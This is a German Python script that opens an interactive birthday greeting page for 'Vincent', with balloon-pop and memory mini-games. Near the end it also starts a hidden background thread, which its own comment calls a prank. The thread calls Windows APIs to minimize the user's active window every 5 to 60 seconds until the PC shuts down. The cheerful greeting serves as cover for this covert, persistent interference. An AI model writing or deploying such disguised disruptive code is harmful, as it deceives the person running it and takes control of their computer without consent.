import webbrowser
import tempfile
import threading
import time
import random
import ctypes
import os
import sys

# HTML-Inhalt als String
html_content = """
<!DOCTYPE html>
<html lang="de">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alles Gute zum Geburtstag, Vincent! 🎂</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }

        body {
            font-family: 'Comic Sans MS', 'Marker Felt', 'Arial', sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
            color: #333;
            position: relative;
        }

        /* Animierter Hintergrund mit Partikeleffekten */
        #particle-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -2;
        }

        /* Container für Hauptinhalte */
        .container {
            max-width: 800px;
            margin: 2rem auto;
            padding: 2rem;
            background: rgba(255, 255, 255, 0.92);
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
            text-align: center;
            position: relative;
            z-index: 10;
            backdrop-filter: blur(10px);
            border: 2px dashed #ff6b6b;
            transition: all 0.3s ease;
        }

        .container:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
        }

        h1 {
            font-size: 3.2rem;
            color: #e91e63;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.1);
            margin-bottom: 1.5rem;
            cursor: pointer;
            transition: all 0.2s ease;
            position: relative;
            display: inline-block;
        }

        h1:hover {
            color: #ff4081;
            transform: scale(1.05);
        }

        h1::after {
            content: '🎂';
            position: absolute;
            right: -30px;
            top: -10px;
            font-size: 1.8rem;
            animation: bounce 2s infinite;
        }

        @keyframes bounce {

            0%,
            100% {
                transform: translateY(0);
            }

            50% {
                transform: translateY(-10px);
            }
        }

        p {
            font-size: 1.4rem;
            margin: 1.5rem 0;
            line-height: 1.6;
            color: #555;
        }

        .highlight {
            background: linear-gradient(120deg, #ff9d7a 0%, #ff6b6b 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: bold;
        }

        .btn {
            display: inline-block;
            margin: 1.5rem 0.5rem;
            padding: 0.9rem 1.8rem;
            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
            color: white;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            font-size: 1.2rem;
            font-weight: bold;
            box-shadow: 0 4px 15px rgba(37, 117, 252, 0.4);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            z-index: 1;
        }

        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 7px 20px rgba(37, 117, 252, 0.6);
            letter-spacing: 1px;
        }

        .btn:active {
            transform: translateY(1px);
        }

        .btn::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #2575fc 0%, #6a11cb 100%);
            opacity: 0;
            transition: opacity 0.3s ease;
            z-index: -1;
        }

        .btn:hover::after {
            opacity: 1;
        }

        /* Minigame Bereiche */
        .game-section {
            display: none;
            margin-top: 2rem;
            padding: 1.5rem;
            background: #f8f9fa;
            border-radius: 15px;
            border: 2px solid #e0e0e0;
        }

        .balloon-game {
            min-height: 300px;
            position: relative;
            background: linear-gradient(to bottom, #87CEEB, #1E90FF);
            border-radius: 15px;
            overflow: hidden;
            margin: 1.5rem 0;
        }

        .balloon {
            position: absolute;
            width: 60px;
            height: 60px;
            background: radial-gradient(circle, #FF6B6B, #FF4500);
            border-radius: 50% 50% 50% 60%;
            cursor: pointer;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
            transition: all 0.3s ease;
            animation: float 15s infinite ease-in-out;
        }

        @keyframes float {

            0%,
            100% {
                transform: translateY(0) rotate(0deg);
            }

            50% {
                transform: translateY(-20px) rotate(5deg);
            }
        }

        .balloon::after {
            content: '';
            position: absolute;
            width: 4px;
            height: 30px;
            background: #333;
            bottom: -25px;
            left: 50%;
            transform: translateX(-50%);
        }

        .balloon.popped {
            transform: scale(0) rotate(360deg) !important;
            animation: none !important;
        }

        .score-board {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 1.5rem;
            margin: 1rem 0;
            font-size: 1.8rem;
            font-weight: bold;
            color: #ff4500;
        }

        .memory-game {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin: 1.5rem auto;
            max-width: 500px;
        }

        .memory-card {
            aspect-ratio: 1;
            background: linear-gradient(145deg, #e6e6e6, #ffffff);
            border-radius: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 2rem;
            cursor: pointer;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            transition: all 0.3s ease;
            transform-style: preserve-3d;
        }

        .memory-card:hover {
            transform: scale(1.05);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }

        .memory-card.flipped {
            transform: rotateY(180deg);
            background: linear-gradient(145deg, #ff9d7a, #ff6b6b);
            color: white;
        }

        .memory-card.matched {
            transform: rotateY(180deg) scale(0.95);
            background: linear-gradient(145deg, #6a11cb, #2575fc);
            color: white;
            cursor: default;
        }

        /* Konfetti-Container */
        #confetti-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1000;
            display: none;
        }

        .confetti {
            position: absolute;
            width: 10px;
            height: 15px;
            opacity: 0.7;
        }

        /* Geheime Überraschung */
        #secretOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 1999;
            display: none;
            backdrop-filter: blur(2px);
        }

        #secretMessage {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 2rem;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            z-index: 2000;
            max-width: 90%;
            width: 500px;
            border: 3px solid #ff4500;
            animation: popIn 0.5s ease;
        }

        @keyframes popIn {
            from {
                transform: translate(-50%, -50%) scale(0.8);
                opacity: 0;
            }

            to {
                transform: translate(-50%, -50%) scale(1);
                opacity: 1;
            }
        }

        #secretMessage h2 {
            color: #ff4500;
            margin-bottom: 1rem;
        }

        #secretMessage p {
            font-size: 1.2rem;
            line-height: 1.6;
            margin-bottom: 1.5rem;
        }

        .close-btn {
            position: absolute;
            top: 15px;
            right: 15px;
            width: 30px;
            height: 30px;
            background: #ff4500;
            color: white;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            font-weight: bold;
            font-size: 1.2rem;
            transition: all 0.3s ease;
            z-index: 2001;
        }

        .close-btn:hover {
            transform: rotate(90deg) scale(1.1);
            background: #e53935;
        }

        .gift-box {
            width: 100px;
            height: 100px;
            background: #e91e63;
            border-radius: 10px;
            margin: 0 auto 1.5rem;
            position: relative;
            transform-style: preserve-3d;
            transition: transform 0.6s;
            cursor: pointer;
        }

        .gift-box:hover {
            transform: rotateY(180deg);
        }

        .gift-box::before {
            content: '';
            position: absolute;
            top: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 15%;
            height: 100%;
            background: #ffeb3b;
        }

        .gift-box::after {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            transform: translateY(-50%);
            width: 100%;
            height: 15%;
            background: #ffeb3b;
        }

        .gift-ribbon {
            position: absolute;
            width: 100%;
            height: 100%;
            background: #ffeb3b;
            transform: rotateY(180deg);
            border-radius: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 3rem;
        }

        /* Responsive Anpassungen */
        @media (max-width: 768px) {
            .container {
                margin: 1rem;
                padding: 1.5rem;
            }

            h1 {
                font-size: 2.5rem;
            }

            p {
                font-size: 1.1rem;
            }

            .btn {
                width: 100%;
                margin: 0.8rem 0;
            }

            #secretMessage {
                width: 90%;
                padding: 1.5rem;
            }

            .close-btn {
                top: 10px;
                right: 10px;
                width: 25px;
                height: 25px;
                font-size: 1rem;
            }
        }
    </style>
</head>

<body>
    <!-- Partikel-Hintergrund -->
    <canvas id="particle-bg"></canvas>

    <!-- Konfetti-Container -->
    <div id="confetti-container"></div>

    <div class="container">
        <h1>Alles Gute zum Geburtstag, Vincent!</h1>
        <p>Ich wünsche dir einen <span class="highlight">wundervollen Tag</span> voller Freude, Lachen und
            unvergesslicher Momente! 🎉</p>
        <p>Hier gibt's nicht nur Glückwünsche, sondern auch <span class="highlight">interaktive Überraschungen</span>
            für dich!</p>

        <button class="btn" id="balloonGameBtn">🎈 Luftballon-Pop-Spiel</button>
        <button class="btn" id="memoryGameBtn">🎁 Memory-Spiel</button>
        <button class="btn" id="surpriseBtn">🔍 Versteckte Überraschung</button>

        <div class="game-section" id="balloonGameSection">
            <h2>Luftballon-Pop Challenge</h2>
            <p>Klicke auf die Luftballons, um sie zu platzen! Platze 10 Ballons, um eine Überraschung zu erhalten.</p>

            <div class="score-board">
                <span>Gesamt: <span id="totalBalloons">0</span>/10</span>
                <span>Punkte: <span id="score">0</span></span>
            </div>

            <div class="balloon-game" id="balloonGameArea">
                <!-- Luftballons werden dynamisch hinzugefügt -->
            </div>

            <button class="btn" id="resetBalloonGame">Neustart</button>
        </div>

        <div class="game-section" id="memoryGameSection">
            <h2>Geschenk-Memory</h2>
            <p>Finde alle passenden Geschenk-Paare! Du hast 30 Sekunden Zeit.</p>

            <div class="score-board">
                <span>Paare: <span id="pairsFound">0</span>/4</span>
                <span>Zeit: <span id="timer">30</span>s</span>
            </div>

            <div class="memory-game" id="memoryGameArea">
                <!-- Memory-Karten werden dynamisch hinzugefügt -->
            </div>

            <button class="btn" id="resetMemoryGame">Neustart</button>
        </div>
    </div>

    <!-- Overlay für die geheime Überraschung -->
    <div id="secretOverlay"></div>

    <!-- Geheime Überraschung -->
    <div id="secretMessage">
        <div class="close-btn" id="closeSecretMessage">×</div>
        <h2>🎉 Überraschung! 🎉</h2>
        <p>Du hast die geheime Nachricht gefunden! Vielen Dank, dass du mein Spiel gespielt hast. Dein Geschenk wartet
            auf dich - schau mal hinter dich! 😉</p>
        <div class="gift-box" id="mysteryGift">
            <div class="gift-ribbon">🎁</div>
        </div>
        <p><em>Klicke auf das Geschenk, um es zu öffnen!</em></p>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function () {
            // Globale Variablen
            let score = 0;
            let totalBalloons = 0;
            let balloonsPopped = 0;
            let gameActive = false;
            let memoryCards = [];
            let flippedCards = [];
            let matchedPairs = 0;
            let timer;
            let timeLeft = 30;

            // DOM-Elemente
            const balloonGameBtn = document.getElementById('balloonGameBtn');
            const memoryGameBtn = document.getElementById('memoryGameBtn');
            const surpriseBtn = document.getElementById('surpriseBtn');
            const balloonGameSection = document.getElementById('balloonGameSection');
            const memoryGameSection = document.getElementById('memoryGameSection');
            const balloonGameArea = document.getElementById('balloonGameArea');
            const resetBalloonGame = document.getElementById('resetBalloonGame');
            const resetMemoryGame = document.getElementById('resetMemoryGame');
            const totalBalloonsEl = document.getElementById('totalBalloons');
            const scoreEl = document.getElementById('score');
            const pairsFoundEl = document.getElementById('pairsFound');
            const timerEl = document.getElementById('timer');
            const secretMessage = document.getElementById('secretMessage');
            const secretOverlay = document.getElementById('secretOverlay');
            const closeSecretMessage = document.getElementById('closeSecretMessage');
            const mysteryGift = document.getElementById('mysteryGift');
            const h1 = document.querySelector('h1');

            // Audio-Elemente - jetzt korrekt initialisiert
            let popSound, successSound;

            // Partikel-Hintergrund
            const canvas = document.getElementById('particle-bg');
            const ctx = canvas.getContext('2d');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;

            let particles = [];
            const particleCount = 80;

            // Partikel initialisieren
            function initParticles() {
                particles = [];
                for (let i = 0; i < particleCount; i++) {
                    particles.push({
                        x: Math.random() * canvas.width,
                        y: Math.random() * canvas.height,
                        size: Math.random() * 5 + 1,
                        speedX: Math.random() * 1 - 0.5,
                        speedY: Math.random() * 1 - 0.5,
                        color: `hsl(${Math.random() * 360}, 80%, 70%)`
                    });
                }
            }

            // Partikel animieren
            function animateParticles() {
                ctx.clearRect(0, 0, canvas.width, canvas.height);

                for (let i = 0; i < particles.length; i++) {
                    let p = particles[i];

                    // Partikel zeichnen
                    ctx.fillStyle = p.color;
                    ctx.beginPath();
                    ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
                    ctx.fill();

                    // Partikel bewegen
                    p.x += p.speedX;
                    p.y += p.speedY;

                    // Randbedingungen
                    if (p.x < 0 || p.x > canvas.width) p.speedX = -p.speedX;
                    if (p.y < 0 || p.y > canvas.height) p.speedY = -p.speedY;
                }

                requestAnimationFrame(animateParticles);
            }

            // Konfetti erstellen
            function createConfetti() {
                const confettiContainer = document.getElementById('confetti-container');
                confettiContainer.style.display = 'block';

                // Vorherige Konfetti entfernen
                confettiContainer.innerHTML = '';

                const confettiCount = 150;
                for (let i = 0; i < confettiCount; i++) {
                    const confetti = document.createElement('div');
                    confetti.classList.add('confetti');

                    // Zufällige Position
                    confetti.style.left = Math.random() * 100 + 'vw';

                    // Zufällige Farbe
                    const hue = Math.random() * 360;
                    confetti.style.backgroundColor = `hsl(${hue}, 70%, 50%)`;

                    // Zufällige Form
                    if (Math.random() > 0.5) {
                        confetti.style.width = (Math.random() * 10 + 5) + 'px';
                        confetti.style.height = '2px';
                    } else {
                        confetti.style.width = '2px';
                        confetti.style.height = (Math.random() * 10 + 5) + 'px';
                    }

                    // Zufällige Rotation
                    const rotation = Math.random() * 360;
                    confetti.style.transform = `rotate(${rotation}deg)`;

                    // Animation
                    const duration = Math.random() * 3 + 2;
                    const delay = Math.random() * 5;
                    confetti.style.animation = `fall ${duration}s ease-in-out ${delay}s forwards`;

                    confettiContainer.appendChild(confetti);
                }

                // Nach 5 Sekunden Konfetti entfernen
                setTimeout(() => {
                    confettiContainer.style.display = 'none';
                }, 5000);
            }

            // Audio initialisieren - mit Fehlerbehandlung
            function initAudio() {
                try {
                    // Einfacher Pop-Sound erzeugen
                    function createPopSound() {
                        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                        const oscillator = audioCtx.createOscillator();
                        const gainNode = audioCtx.createGain();

                        oscillator.type = 'sine';
                        oscillator.frequency.setValueAtTime(800, audioCtx.currentTime);
                        oscillator.frequency.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.1);

                        gainNode.gain.setValueAtTime(0.5, audioCtx.currentTime);
                        gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.1);

                        oscillator.connect(gainNode);
                        gainNode.connect(audioCtx.destination);

                        oscillator.start();
                        oscillator.stop(audioCtx.currentTime + 0.1);
                    }

                    // Einfachen Erfolgs-Sound erzeugen
                    function createSuccessSound() {
                        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                        const oscillator = audioCtx.createOscillator();
                        const gainNode = audioCtx.createGain();

                        oscillator.type = 'sine';
                        oscillator.frequency.setValueAtTime(400, audioCtx.currentTime);
                        oscillator.frequency.linearRampToValueAtTime(600, audioCtx.currentTime + 0.3);

                        gainNode.gain.setValueAtTime(0.7, audioCtx.currentTime);
                        gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);

                        oscillator.connect(gainNode);
                        gainNode.connect(audioCtx.destination);

                        oscillator.start();
                        oscillator.stop(audioCtx.currentTime + 0.3);
                    }

                    // Sound-Funktionen zuweisen
                    popSound = {
                        play: function () {
                            try {
                                createPopSound();
                            } catch (e) {
                                console.log("Pop-Sound konnte nicht abgespielt werden", e);
                            }
                        }
                    };

                    successSound = {
                        play: function () {
                            try {
                                createSuccessSound();
                            } catch (e) {
                                console.log("Erfolgs-Sound konnte nicht abgespielt werden", e);
                            }
                        }
                    };
                } catch (e) {
                    console.log("Audio-Initialisierung fehlgeschlagen", e);
                    // Fallback ohne Sound
                    popSound = { play: function () { } };
                    successSound = { play: function () { } };
                }
            }

            // Luftballon-Spiel
            function startBalloonGame() {
                balloonGameSection.style.display = 'block';
                score = 0;
                totalBalloons = 0;
                balloonsPopped = 0;
                scoreEl.textContent = score;
                totalBalloonsEl.textContent = totalBalloons;

                // Vorherige Ballons entfernen
                balloonGameArea.innerHTML = '';

                // Neue Ballons erstellen
                createBalloons(15);
            }

            function createBalloons(count) {
                for (let i = 0; i < count; i++) {
                    setTimeout(() => {
                        if (balloonsPopped >= 10) return;

                        const balloon = document.createElement('div');
                        balloon.classList.add('balloon');

                        // Zufällige Position
                        const left = Math.random() * 85 + 5;
                        const top = Math.random() * 85 + 5;
                        balloon.style.left = `${left}vw`;
                        balloon.style.top = `${top}vh`;

                        // Zufällige Größe
                        const size = Math.random() * 40 + 20;
                        balloon.style.width = `${size}px`;
                        balloon.style.height = `${size * 1.2}px`;

                        // Zufällige Farbe
                        const hue = Math.random() * 360;
                        balloon.style.background = `radial-gradient(circle, hsl(${hue}, 100%, 60%), hsl(${hue}, 100%, 40%))`;

                        // Animation delay
                        balloon.style.animationDelay = `${Math.random() * 5}s`;

                        balloon.addEventListener('click', function () {
                            if (balloon.classList.contains('popped')) return;

                            // Sound abspielen
                            popSound.play();

                            balloon.classList.add('popped');
                            score += Math.floor(size / 5);
                            totalBalloons++;
                            balloonsPopped++;

                            scoreEl.textContent = score;
                            totalBalloonsEl.textContent = totalBalloons;

                            // Erfolg bei 10 geplatzten Ballons
                            if (balloonsPopped >= 10) {
                                setTimeout(() => {
                                    successSound.play();
                                    createConfetti();
                                    alert('🎉 Glückwunsch! Du hast alle Ballons geplatzt! Viel Spaß mit deinem Geschenk! 🎁');
                                }, 500);
                            }
                        });

                        balloonGameArea.appendChild(balloon);
                    }, i * 1000);
                }
            }

            // Memory-Spiel
            function startMemoryGame() {
                memoryGameSection.style.display = 'block';
                memoryCards = [
                    '🎁', '🎁', '🎂', '🎂',
                    '🎉', '🎉', '🎈', '🎈'
                ];
                flippedCards = [];
                matchedPairs = 0;
                timeLeft = 30;
                timerEl.textContent = timeLeft;
                pairsFoundEl.textContent = matchedPairs;

                // Karten mischen
                memoryCards = memoryCards.sort(() => Math.random() - 0.5);

                // Timer starten
                clearInterval(timer);
                timer = setInterval(updateTimer, 1000);

                // Vorherige Karten entfernen
                document.getElementById('memoryGameArea').innerHTML = '';

                // Neue Karten erstellen
                memoryCards.forEach((card, index) => {
                    const cardElement = document.createElement('div');
                    cardElement.classList.add('memory-card');
                    cardElement.dataset.index = index;
                    cardElement.dataset.value = card;
                    cardElement.innerHTML = '?';

                    cardElement.addEventListener('click', flipCard);

                    document.getElementById('memoryGameArea').appendChild(cardElement);
                });
            }

            function flipCard() {
                if (flippedCards.length === 2 || this.classList.contains('flipped') || this.classList.contains('matched')) {
                    return;
                }

                this.classList.add('flipped');
                this.innerHTML = this.dataset.value;
                flippedCards.push(this);

                if (flippedCards.length === 2) {
                    setTimeout(checkMatch, 1000);
                }
            }

            function checkMatch() {
                const [card1, card2] = flippedCards;

                if (card1.dataset.value === card2.dataset.value) {
                    card1.classList.add('matched');
                    card2.classList.add('matched');
                    matchedPairs++;
                    pairsFoundEl.textContent = matchedPairs;

                    // Erfolg bei 4 Paaren
                    if (matchedPairs === 4) {
                        clearInterval(timer);
                        successSound.play();
                        createConfetti();
                        alert('🎉 Super! Du hast alle Paare gefunden! Viel Spaß mit deinem Geschenk! 🎁');
                    }
                } else {
                    card1.classList.remove('flipped');
                    card2.classList.remove('flipped');
                    card1.innerHTML = '?';
                    card2.innerHTML = '?';
                }

                flippedCards = [];
            }

            function updateTimer() {
                timeLeft--;
                timerEl.textContent = timeLeft;

                if (timeLeft <= 0) {
                    clearInterval(timer);
                    alert('Leider Zeit abgelaufen! Versuche es nochmal.');
                }
            }

            // Geheime Überraschung
            let clickCount = 0;

            h1.addEventListener('click', () => {
                clickCount++;

                if (clickCount >= 7) {
                    secretMessage.style.display = 'block';
                    secretOverlay.style.display = 'block';
                    clickCount = 0;

                    // Leichtes Schütteln des Titels
                    h1.style.animation = 'shake 0.5s';
                    setTimeout(() => {
                        h1.style.animation = '';
                    }, 500);
                }
            });

            mysteryGift.addEventListener('click', () => {
                mysteryGift.style.transform = 'rotateY(180deg)';
                setTimeout(() => {
                    alert('🎉 Herzlichen Glückwunsch! Genieße deinen besonderen Tag! 🎂');
                    createConfetti();
                }, 600);
            });

            // Funktion zum Schließen der geheimen Nachricht
            function closeSecretMessageFunc() {
                secretMessage.style.display = 'none';
                secretOverlay.style.display = 'none';
            }

            // Event Listener für Schließen-Button
            if (closeSecretMessage) {
                closeSecretMessage.addEventListener('click', closeSecretMessageFunc);
            }

            // Event Listener für Overlay-Klick
            if (secretOverlay) {
                secretOverlay.addEventListener('click', closeSecretMessageFunc);
            }

            // Event Listener
            if (balloonGameBtn) {
                balloonGameBtn.addEventListener('click', startBalloonGame);
            }

            if (memoryGameBtn) {
                memoryGameBtn.addEventListener('click', startMemoryGame);
            }

            if (resetBalloonGame) {
                resetBalloonGame.addEventListener('click', startBalloonGame);
            }

            if (resetMemoryGame) {
                resetMemoryGame.addEventListener('click', startMemoryGame);
            }

            if (surpriseBtn) {
                surpriseBtn.addEventListener('click', () => {
                    h1.click();
                    h1.click();
                    h1.click();
                    h1.click();
                    h1.click();
                    h1.click();
                    h1.click();
                });
            }

            // Fenster-Größenänderung
            window.addEventListener('resize', () => {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                initParticles();
            });

            // Initialisierung
            initParticles();
            animateParticles();
            initAudio();

            // Willkommensnachricht nach 1 Sekunde
            setTimeout(() => {
                alert('🎉 Willkommen zu deinem interaktiven Geburtstagsgruß! Spiele die Minigames und finde die versteckten Überraschungen! 🎂');
            }, 1000);
        });
    </script>
</body>

</html>
"""

# Hintergrundfunktion zum Minimieren des aktiven Fensters
def minimize_random():
    user32 = ctypes.windll.user32
    while True:
        wait = random.randint(5, 60)
        time.sleep(wait)
        hwnd = user32.GetForegroundWindow()
        user32.ShowWindow(hwnd, 6)  # 6 = SW_MINIMIZE

# HTML-Datei im Temp-Ordner speichern und öffnen
def launch_html():
    with tempfile.NamedTemporaryFile(delete=False, suffix=".html", mode='w', encoding='utf-8') as f:
        f.write(html_content)
        webbrowser.open(f.name)

if __name__ == "__main__":
    # Starte HTML
    launch_html()
    # Starte Hintergrund-Prank
    threading.Thread(target=minimize_random, daemon=True).start()
    # Halte das Skript am Leben (wird beendet wenn PC runterfährt)
    while True:
        time.sleep(1)